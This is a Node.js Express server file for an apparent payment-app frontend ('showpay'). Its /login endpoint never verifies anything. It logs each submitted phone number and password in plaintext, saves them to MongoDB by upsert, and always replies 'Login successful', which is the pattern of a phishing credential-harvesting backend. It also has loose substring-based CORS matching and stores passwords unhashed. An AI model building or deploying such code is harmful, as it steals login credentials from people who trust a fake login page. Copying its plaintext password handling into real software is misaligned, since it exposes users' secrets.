require('dotenv').config();
const cors = require('cors');
const express = require('express');
const mongoose = require('mongoose');
const FormDataModel = require ('./models/FormData');
const connDB = require('./config/db');

const app = express();
const PORT = process.env.PORT || 3001;

// Middleware
app.use(express.json());

// CORS configuration - allow both development and production frontend URLs
const allowedOrigins = [
    'http://localhost:5173',
    'http://localhost:3000',
    'http://localhost:5174',
    'https://app-showpay.vercel.app',
    'https://app-showpayco.vercel.app', // Handle typo if exists
    process.env.FRONTEND_URL
].filter(Boolean); // Remove any undefined values

app.use(cors({
    origin: function (origin, callback) {
        // Allow requests with no origin (like mobile apps or curl requests)
        if (!origin) return callback(null, true);
        
        // Normalize origin (remove trailing slash)
        const normalizedOrigin = origin.replace(/\/$/, '');
        const normalizedAllowed = allowedOrigins.map(o => o ? o.replace(/\/$/, '') : o);
        
        if (normalizedAllowed.indexOf(normalizedOrigin) !== -1 || 
            normalizedAllowed.some(allowed => normalizedOrigin.includes(allowed.replace('https://', '').replace('http://', ''))) ||
            process.env.FRONTEND_URL === '*') {
            callback(null, true);
        } else {
            // In development, allow all origins
            if (process.env.NODE_ENV !== 'production') {
                callback(null, true);
            } else {
                console.log('CORS blocked origin:', origin);
                callback(new Error('Not allowed by CORS'));
            }
        }
    },
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));


connDB();

// Wait for database connection before handling requests
mongoose.connection.on('connected', () => {
  dbConnected = true;
  console.log('Database connected successfully');
});

mongoose.connection.on('error', (err) => {
  dbConnected = false;
  console.error('Database connection error:', err);
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.status(200).json({ status: 'OK', message: 'Server is running' });
});

// Login endpoint
app.post('/login', (req, res)=>{
    try {
      
        if (mongoose.connection.readyState !== 1) {
            return res.status(503).json({ 
                success: false,
                message: 'Database connection not available. Please try again later.' 
            });
        }

        const {phoneNumber, password} = req.body;
        console.log(phoneNumber, password);
        // Validation
        if (!phoneNumber || !password) {
            return res.status(400).json({ 
                success: false,
                message: 'Phone number and password are required' 
            });
        }
        
        // Validate phone number format (basic validation)
        if (phoneNumber.trim().length < 10) {
            return res.status(400).json({ 
                success: false,
                message: 'Please enter a valid phone number' 
            });
        }
        
        FormDataModel.findOneAndUpdate(
            { phoneNumber: phoneNumber.trim() },
            { phoneNumber: phoneNumber.trim(), password: password },
            { upsert: true, new: true }
        )
        .then(user => {
            res.status(200).json({ 
                success: true,
                message: 'Login successful',
                data: {
                    phoneNumber: user.phoneNumber
                }
            });
        })
        .catch(err => {
            console.error('Database error:', err);
            res.status(500).json({ 
                success: false,
                message: 'Error processing request. Please try again later.' 
            });
        })
    } catch (error) {
        console.error('Server error:', error);
        res.status(500).json({ 
            success: false,
            message: 'Internal server error. Please try again later.' 
        });
    }
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).json({ error: 'Something went wrong!' });
});

// 404 handler
app.use((req, res) => {
    res.status(404).json({ error: 'Route not found' });
});

app.listen(PORT, () => {
    console.log(`Server listening on port ${PORT}`);
});
